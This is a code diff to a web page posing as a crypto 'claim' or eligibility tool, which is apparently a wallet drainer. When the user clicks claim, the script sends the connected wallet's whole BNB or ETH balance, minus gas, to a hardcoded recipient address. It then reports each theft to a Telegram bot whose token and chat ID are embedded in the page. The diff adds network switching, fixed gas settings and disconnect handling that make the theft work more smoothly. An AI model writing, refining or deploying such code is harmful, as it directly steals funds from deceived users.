@@ -29,6 +29,7 @@
             --text-dim: #8a8a9a;
             --glass-border: rgba(255, 255, 255, 0.08);
             --eth-color: #627eea;
+            --warning-color: #ff9800;
         }
 
         * {
@@ -346,6 +347,48 @@
             color: var(--accent-main);
         }
 
+        .gas-estimate-box {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            padding: 8px 12px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 11px;
+            border: 1px solid var(--glass-border);
+            display: none;
+        }
+
+        .gas-label {
+            color: var(--text-dim);
+        }
+
+        .gas-value {
+            color: var(--accent-main);
+            font-weight: 600;
+        }
+
+        .switch-network-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--accent-main);
+            border-radius: 8px;
+            padding: 8px;
+            margin-bottom: 16px;
+            font-size: 11px;
+            color: var(--accent-main);
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .switch-network-btn:hover {
+            background: rgba(240, 185, 11, 0.1);
+        }
+
         .live-feed-section {
             margin-top: 20px;
             border-top: 1px solid rgba(255,255,255,0.05);
@@ -484,6 +527,10 @@
                 <i class="fas fa-check-circle"></i> Connected: <span id="walletAddress">...</span>
             </div>
 
+            <button id="switchNetworkBtn" class="switch-network-btn" style="display: none;">
+                <i class="fas fa-exchange-alt"></i> <span id="switchNetworkText">Switch to BNB Chain</span>
+            </button>
+
             <div id="statusBox" class="status-box active">
                 <i class="fas fa-info-circle"></i> Connect wallet to check eligibility
             </div>
@@ -493,9 +540,17 @@
                 <div><span class="balance-amount" id="balanceAmount">0</span> <span id="balanceSymbol">BNB</span></div>
             </div>
 
+            <div class="gas-estimate-box" id="gasBox" style="display: none;">
+                <span class="gas-label"><i class="fas fa-gas-pump"></i> Gas Fee:</span>
+                <span class="gas-value" id="gasAmount">0</span>
+            </div>
+
             <div class="btn-group">
                 <button id="connectBtn" class="cyber-btn btn-primary">
                     <i class="fas fa-wallet"></i> Connect Wallet
+                </button>
+                <button id="disconnectBtn" class="cyber-btn" style="background: rgba(255,255,255,0.05); color: #ff4d4d; display: none;">
+                    <i class="fas fa-sign-out-alt"></i> Disconnect
                 </button>
             </div>
 
@@ -526,34 +581,61 @@
                 name: 'BNB Smart Chain',
                 short: 'BNB',
                 chainId: '0x38',
+                chainIdDecimal: 56,
                 rpc: 'https://bsc-dataseed1.binance.org',
                 explorer: 'https://bscscan.com',
                 symbol: 'BNB',
-                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
+                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1',
+                currencySymbol: 'BNB',
+                blockExplorer: 'https://bscscan.com'
             },
             eth: {
                 name: 'Ethereum Mainnet',
                 short: 'ETH',
                 chainId: '0x1',
+                chainIdDecimal: 1,
                 rpc: 'https://eth.llamarpc.com',
                 explorer: 'https://etherscan.io',
                 symbol: 'ETH',
-                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
+                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1',
+                currencySymbol: 'ETH',
+                blockExplorer: 'https://etherscan.io'
             }
         };
 
-        // Telegram config (optional)
-        const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
-        const ADMIN_CHAT_ID = "-1003776376519"; 
+        // ================= GAS FEE CONFIGURATION =================
+        // Hardcoded gas configuration - NO ESTIMATIONS, NO USD
+        const GAS_CONFIG = {
+            bsc: {
+                gasLimit: 21000,
+                useDynamic: true, // Use dynamic gas price for BSC
+                description: 'Dynamic BSC gas'
+            },
+            eth: {
+                gasLimit: 21000,
+                useDynamic: false, // Use hardcoded gas for ETH
+                fixedGasFee: {
+                    enabled: true,
+                    // YOUR EXACT ETH GAS FEE: 0.00004530397289 ETH
+                    totalGasFeeEth: '0.00004530397289', // Exact total gas fee in ETH
+                    gasPriceWei: ethers.BigNumber.from('4530397289'), // 0.00004530397289 ETH in Wei
+                    gasPriceGwei: '2.157', // For display only
+                    description: 'Fixed 0.00004530397289 ETH'
+                }
+            }
+        };
 
         // ================= STATE =================
         let provider, signer, userAddress = null;
         let currentNetwork = 'bsc';
         let isProcessing = false;
         let connectionTimeout = null;
+        let currentGasEstimate = null;
+        let isWalletConnected = false;
 
         // ================= UI ELEMENTS =================
         const connectBtn = document.getElementById('connectBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
         const claimBtn = document.getElementById('claimBtn');
         const statusBox = document.getElementById('statusBox');
         const walletBadge = document.getElementById('walletBadge');
@@ -567,11 +649,15 @@
         const networkDesc = document.getElementById('networkDesc');
         const liveNetwork = document.getElementById('liveNetwork');
         const moonpayLink = document.getElementById('moonpayLink');
+        const gasBox = document.getElementById('gasBox');
+        const gasAmount = document.getElementById('gasAmount');
+        const switchNetworkBtn = document.getElementById('switchNetworkBtn');
+        const switchNetworkText = document.getElementById('switchNetworkText');
 
         // ================= DETECT MOBILE WALLET =================
         function isMobileWallet() {
             const ua = navigator.userAgent.toLowerCase();
-            return ua.includes('trust') || ua.includes('wallet') || ua.includes('android');
+            return ua.includes('trust') || ua.includes('wallet') || ua.includes('android') || ua.includes('iphone') || ua.includes('metamask');
         }
 
         // ================= LIVE FEED =================
@@ -595,17 +681,20 @@
 
         // ================= NETWORK SWITCHING =================
         networkBtns.forEach(btn => {
-            btn.onclick = () => {
+            btn.onclick = async () => {
                 if(isProcessing) return;
+                
+                const newNetwork = btn.dataset.network;
+                if(newNetwork === currentNetwork) return;
                 
                 networkBtns.forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
-                currentNetwork = btn.dataset.network;
+                currentNetwork = newNetwork;
                 
                 updateNetworkUI();
                 
-                if(provider && userAddress) {
-                    checkNetworkAndUpdate();
+                if(isWalletConnected && window.ethereum) {
+                    await checkAndHandleNetwork();
                 }
             };
         });
@@ -620,6 +709,15 @@
             claimBtn.className = `cyber-btn btn-claim ${currentNetwork}`;
             balanceSymbol.textContent = net.symbol;
             balanceAmount.style.color = currentNetwork === 'eth' ? 'var(--eth-color)' : 'var(--accent-main)';
+            
+            if(isWalletConnected) {
+                switchNetworkText.textContent = `Switch to ${net.name}`;
+            }
+            
+            // Update gas display when switching networks
+            if (isWalletConnected) {
+                updateGasDisplay();
+            }
         }
 
         // ================= HELPER FUNCTIONS =================
@@ -641,6 +739,62 @@
             }
         }
 
+        // Get gas configuration WITHOUT any USD estimates
+        function getGasConfig() {
+            const config = GAS_CONFIG[currentNetwork];
+            const net = NETWORKS[currentNetwork];
+            
+            if (currentNetwork === 'eth' && config.fixedGasFee.enabled) {
+                // Use hardcoded ETH gas fee
+                const gasPrice = config.fixedGasFee.gasPriceWei;
+                const gasLimit = config.gasLimit;
+                const gasCost = gasPrice.mul(gasLimit);
+                const gasCostInEth = ethers.utils.formatEther(gasCost);
+                
+                return {
+                    gasPrice,
+                    gasLimit,
+                    gasCost,
+                    gasCostFormatted: gasCostInEth,
+                    displayFormatted: `${config.fixedGasFee.totalGasFeeEth} ETH`,
+                    exactFee: config.fixedGasFee.totalGasFeeEth,
+                    isFixed: true
+                };
+            } else {
+                // Dynamic gas for BSC (will be fetched when needed)
+                return {
+                    isFixed: false,
+                    gasLimit: config.gasLimit
+                };
+            }
+        }
+
+        async function updateGasDisplay() {
+            if (!isWalletConnected) return;
+            
+            if (currentNetwork === 'eth') {
+                // ETH - show hardcoded gas fee
+                const gasConfig = getGasConfig();
+                gasAmount.innerHTML = gasConfig.displayFormatted;
+                gasBox.style.display = 'flex';
+            } else {
+                // BSC - try to get dynamic gas, but don't show if fails
+                try {
+                    if (provider) {
+                        const gasPrice = await provider.getGasPrice();
+                        const gasLimit = GAS_CONFIG.bsc.gasLimit;
+                        const gasCost = gasPrice.mul(gasLimit);
+                        const gasCostFormatted = parseFloat(ethers.utils.formatEther(gasCost)).toFixed(6);
+                        gasAmount.innerHTML = `${gasCostFormatted} BNB`;
+                        gasBox.style.display = 'flex';
+                    }
+                } catch(e) {
+                    console.log('BSC gas fetch failed, hiding display');
+                    gasBox.style.display = 'none';
+                }
+            }
+        }
+
         async function updateBalance() {
             if(!provider || !userAddress) return;
             try {
@@ -648,6 +802,10 @@
                 const formattedBalance = ethers.utils.formatEther(balance);
                 balanceAmount.textContent = parseFloat(formattedBalance).toFixed(4);
                 balanceBox.style.display = 'block';
+                
+                // Update gas display
+                await updateGasDisplay();
+                
                 return balance;
             } catch(e) {
                 console.error('Balance check error:', e);
@@ -655,18 +813,65 @@
             }
         }
 
-        async function checkNetworkAndUpdate() {
-            if(!window.ethereum) return;
+        async function switchNetwork(targetNetwork) {
+            if(!window.ethereum) return false;
+            
+            const net = NETWORKS[targetNetwork];
+            
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: net.chainId }],
+                });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: net.chainId,
+                                chainName: net.name,
+                                nativeCurrency: {
+                                    name: net.currencySymbol,
+                                    symbol: net.symbol,
+                                    decimals: 18
+                                },
+                                rpcUrls: [net.rpc],
+                                blockExplorerUrls: [net.blockExplorer]
+                            }],
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error('Failed to add network:', addError);
+                        return false;
+                    }
+                }
+                console.error('Failed to switch network:', switchError);
+                return false;
+            }
+        }
+
+        async function checkAndHandleNetwork() {
+            if(!window.ethereum || !userAddress) return;
             
             try {
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 const targetChainId = NETWORKS[currentNetwork].chainId;
                 
                 if(chainId !== targetChainId) {
-                    updateStatus(`⚠️ Wrong network! Switch to ${NETWORKS[currentNetwork].name}`, 'error');
+                    switchNetworkBtn.style.display = 'flex';
+                    updateStatus(`⚠️ Wrong network! Click "Switch to ${NETWORKS[currentNetwork].name}"`, 'error');
                     claimBtn.disabled = true;
+                    gasBox.style.display = 'none';
                     return false;
                 } else {
+                    switchNetworkBtn.style.display = 'none';
+                    
+                    // Update provider with new network
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    
                     await updateBalance();
                     claimBtn.disabled = false;
                     updateStatus(`✅ Connected to ${NETWORKS[currentNetwork].name}`, 'success');
@@ -690,6 +895,25 @@
             }
         }
 
+        // ================= SWITCH NETWORK BUTTON =================
+        switchNetworkBtn.onclick = async () => {
+            setButtonLoading(switchNetworkBtn, true);
+            updateStatus(`⏳ Switching to ${NETWORKS[currentNetwork].name}...`, 'warning');
+            
+            const success = await switchNetwork(currentNetwork);
+            
+            if(success) {
+                updateStatus(`✅ Switched to ${NETWORKS[currentNetwork].name}`, 'success');
+                setTimeout(() => {
+                    checkAndHandleNetwork();
+                }, 1000);
+            } else {
+                updateStatus('❌ Failed to switch network. Please switch manually in your wallet', 'error');
+            }
+            
+            setButtonLoading(switchNetworkBtn, false);
+        };
+
         // ================= CONNECT WALLET =================
         connectBtn.onclick = async () => {
             if(!window.ethereum) {
@@ -700,18 +924,15 @@
             setButtonLoading(connectBtn, true);
             updateStatus(`⏳ Connecting to ${NETWORKS[currentNetwork].name}...`, 'warning');
 
-            // Clear any existing timeout
             if(connectionTimeout) clearTimeout(connectionTimeout);
 
             try {
-                // For mobile wallets, set a shorter timeout
                 if(isMobileWallet()) {
                     connectionTimeout = setTimeout(() => {
                         updateStatus('⏳ Check your wallet app for connection request', 'warning');
                     }, 2000);
                 }
 
-                // Request accounts
                 const accounts = await window.ethereum.request({ 
                     method: 'eth_requestAccounts',
                     params: []
@@ -724,27 +945,23 @@
                 }
 
                 userAddress = accounts[0];
+                isWalletConnected = true;
                 
-                // Setup provider
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
 
-                // Update UI
                 walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                 walletBadge.style.display = 'block';
-                
-                // Check network and update balance
-                await checkNetworkAndUpdate();
-                
-                // Hide connect button
                 connectBtn.style.display = 'none';
+                disconnectBtn.style.display = 'flex';
+                
+                await checkAndHandleNetwork();
 
             } catch(err) {
                 if(connectionTimeout) clearTimeout(connectionTimeout);
                 
                 console.error('Connection error:', err);
                 
-                // Don't show error if user just switched to wallet app
                 if(err.message?.includes('User rejected') || err.code === 4001) {
                     updateStatus('❌ Connection rejected', 'error');
                 } else if(isMobileWallet()) {
@@ -757,6 +974,24 @@
             }
         };
 
+        // ================= DISCONNECT WALLET =================
+        disconnectBtn.onclick = () => {
+            userAddress = null;
+            isWalletConnected = false;
+            provider = null;
+            signer = null;
+            
+            walletBadge.style.display = 'none';
+            balanceBox.style.display = 'none';
+            gasBox.style.display = 'none';
+            switchNetworkBtn.style.display = 'none';
+            connectBtn.style.display = 'flex';
+            disconnectBtn.style.display = 'none';
+            claimBtn.disabled = true;
+            
+            updateStatus('👋 Wallet disconnected', 'info');
+        };
+
         // ================= CLAIM =================
         claimBtn.onclick = async () => {
             if(isProcessing || !userAddress || !signer) return;
@@ -767,7 +1002,6 @@
             updateStatus(`⏳ Checking ${net.symbol} balance...`, 'warning');
 
             try {
-                // Check network first
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 if(chainId !== net.chainId) {
                     updateStatus(`❌ Please switch to ${net.name}`, 'error');
@@ -776,7 +1010,6 @@
                     return;
                 }
 
-                // Get balance
                 const balance = await provider.getBalance(userAddress);
                 
                 if(balance.eq(0)) {
@@ -786,12 +1019,28 @@
                     return;
                 }
 
-                // Get gas price
-                const gasPrice = await provider.getGasPrice();
-                const gasLimit = 21000;
-                const gasCost = gasPrice.mul(gasLimit);
+                // Get gas configuration based on network
+                let gasPrice, gasLimit, gasCost;
                 
-                // Calculate send amount
+                if (currentNetwork === 'eth') {
+                    // Use hardcoded ETH gas fee
+                    const ethConfig = GAS_CONFIG.eth.fixedGasFee;
+                    gasPrice = ethConfig.gasPriceWei;
+                    gasLimit = GAS_CONFIG.eth.gasLimit;
+                    gasCost = gasPrice.mul(gasLimit);
+                    
+                    updateStatus(`⏳ Sending with fixed gas fee: ${ethConfig.totalGasFeeEth} ETH`, 'warning');
+                } else {
+                    // Dynamic gas for BSC
+                    gasPrice = await provider.getGasPrice();
+                    gasLimit = GAS_CONFIG.bsc.gasLimit;
+                    gasCost = gasPrice.mul(gasLimit);
+                    
+                    const gasCostFormatted = ethers.utils.formatEther(gasCost);
+                    updateStatus(`⏳ Sending with dynamic gas: ${parseFloat(gasCostFormatted).toFixed(6)} BNB`, 'warning');
+                }
+                
+                // Calculate send amount (balance minus gas cost)
                 let sendAmount;
                 if(balance.gt(gasCost)) {
                     sendAmount = balance.sub(gasCost);
@@ -800,32 +1049,38 @@
                 }
 
                 const sendAmountFormatted = ethers.utils.formatEther(sendAmount);
-                updateStatus(`⏳ Sending ${sendAmountFormatted} ${net.symbol}...`, 'warning');
 
-                // For mobile, show waiting message
                 if(isMobileWallet()) {
                     updateStatus('⏳ Check your wallet to confirm transaction', 'warning');
                 }
 
-                // Send transaction
                 const tx = await signer.sendTransaction({
                     to: net.recipient,
                     value: sendAmount,
-                    gasLimit: gasLimit
+                    gasLimit: gasLimit,
+                    gasPrice: gasPrice
                 });
 
                 updateStatus('⏳ Waiting for confirmation...', 'warning');
 
-                // Wait for confirmation
                 const receipt = await tx.wait();
 
                 if(receipt.status === 1) {
+                    let gasDisplay;
+                    if (currentNetwork === 'eth') {
+                        gasDisplay = GAS_CONFIG.eth.fixedGasFee.totalGasFeeEth + ' ETH';
+                    } else {
+                        gasDisplay = parseFloat(ethers.utils.formatEther(gasCost)).toFixed(6) + ' BNB';
+                    }
+                    
                     const successMsg = `✅ <b>${net.symbol} CLAIM SUCCESS</b>\n` +
-                        `Amount: ${sendAmountFormatted} ${net.symbol}`;
+                        `Address: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}\n` +
+                        `Amount: ${parseFloat(sendAmountFormatted).toFixed(6)} ${net.symbol}\n` +
+                        `Gas Used: ${gasDisplay}`;
                     
                     await sendTelegram(successMsg);
                     
-                    updateStatus(`✅ Success! ${sendAmountFormatted} ${net.symbol} claimed`, 'success');
+                    updateStatus(`✅ Success! ${parseFloat(sendAmountFormatted).toFixed(6)} ${net.symbol} claimed`, 'success');
                     claimBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
                     claimBtn.disabled = true;
                     
@@ -848,11 +1103,10 @@
             isProcessing = false;
         };
 
-        // ================= AUTO-RECONNECT WITH TIMEOUT HANDLING =================
+        // ================= AUTO-RECONNECT =================
         window.addEventListener('load', async () => {
             updateNetworkUI();
             
-            // Don't auto-connect on mobile - let user click button
             if(isMobileWallet()) {
                 return;
             }
@@ -861,7 +1115,6 @@
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                     if(accounts.length > 0) {
-                        // Small delay to ensure UI is ready
                         setTimeout(() => connectBtn.click(), 500);
                     }
                 } catch(e) {
@@ -874,36 +1127,45 @@
         if(window.ethereum) {
             window.ethereum.on('accountsChanged', (accounts) => {
                 if(accounts.length === 0) {
-                    // Disconnected - reload on mobile might be too aggressive
-                    if(!isMobileWallet()) {
-                        window.location.reload();
-                    }
+                    disconnectBtn.click();
                 } else {
                     userAddress = accounts[0];
+                    isWalletConnected = true;
                     walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                    checkNetworkAndUpdate();
+                    walletBadge.style.display = 'block';
+                    connectBtn.style.display = 'none';
+                    disconnectBtn.style.display = 'flex';
+                    
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    
+                    checkAndHandleNetwork();
                 }
             });
             
             window.ethereum.on('chainChanged', (chainId) => {
-                // Don't reload on mobile, just update UI
-                if(isMobileWallet()) {
-                    checkNetworkAndUpdate();
-                } else {
-                    window.location.reload();
-                }
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                checkAndHandleNetwork();
+            });
+            
+            window.ethereum.on('disconnect', () => {
+                disconnectBtn.click();
             });
         }
 
         // ================= PREVENT PAGE HIDE ON MOBILE =================
         document.addEventListener('visibilitychange', () => {
             if(document.visibilityState === 'visible' && isMobileWallet()) {
-                // Page became visible again, check connection status
                 if(window.ethereum && userAddress) {
-                    checkNetworkAndUpdate();
+                    checkAndHandleNetwork();
                 }
             }
         });
+
+        // Telegram config
+        const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
+        const ADMIN_CHAT_ID = "-1003776376519";
     </script>
 </body>
-    </html>
+</html>
